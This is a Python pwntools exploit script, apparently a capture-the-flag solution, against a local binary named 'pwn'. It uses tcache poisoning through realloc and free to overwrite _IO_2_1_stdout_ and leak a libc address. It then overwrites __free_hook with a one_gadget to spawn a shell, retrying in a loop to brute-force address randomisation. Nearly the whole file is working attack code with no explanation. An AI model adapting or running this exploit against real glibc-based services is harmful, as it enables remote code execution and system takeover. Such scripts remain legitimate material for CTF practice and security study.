#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(" ")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    lg("p.pid")
    input()

def freeN():
	ru(b">>")
	sl(b"2")
def reallocN(size, content):
	ru(b">>")
	sl(b"1")
	ru(b"Size?\n")
	sl(str(size).encode())
	ru(b"t?\n")
	sn(content)
def clearN():
	ru(b">>")
	sl(b"1")
	ru(b"Size?\n")
	sl(str(0).encode())
	ru(b"t?\n")
	sn(b'')
def ba():
	ru(b">>")
	sl(b"666")

while 1:
	p = process(filename)
	try:
		reallocN(0x20, b'aaa')
		clearN()
		reallocN(0x100, b'bbb')
		reallocN(0xa0, b'bbb')
		for i in range(7):
			freeN()
		clearN()
		reallocN(0x20, b'aaa')
		reallocN(0xc0, b'c'*0x20 + p64(0) + p64(0x51) + p16((0x6 << 0xc) + (l.symbols['_IO_2_1_stdout_'] & 0xfff)))
		clearN()
		reallocN(0xa0, b'aaa')
		clearN()
		payload = p64(0xfbad1887) + p64(0)*3+ p8(0x58)
		reallocN(0xa0, payload)
		leak = uu64(rn(6))
		if leak >> 40 != 0x7f:
			raise Exception("error")
		lg("leak")
		libc_addr = leak - 0x3e82a0
		one_gadget= libc_addr + 0x4f3c2
		lg("libc_addr")

		ba()
		payload = b'a'*0x20 + p64(0) + p64(0x41) + p64(libc_addr + l.symbols['__free_hook'])
		reallocN(0xd0, payload)
		clearN()
		reallocN(0x40, b'aaa')
		clearN()
		reallocN(0x40, p64(one_gadget))
		freeN()

		debugPID()
		irt()
	except Exception as e:
		print(e)
		# debugPID()
		p.close()
		continue


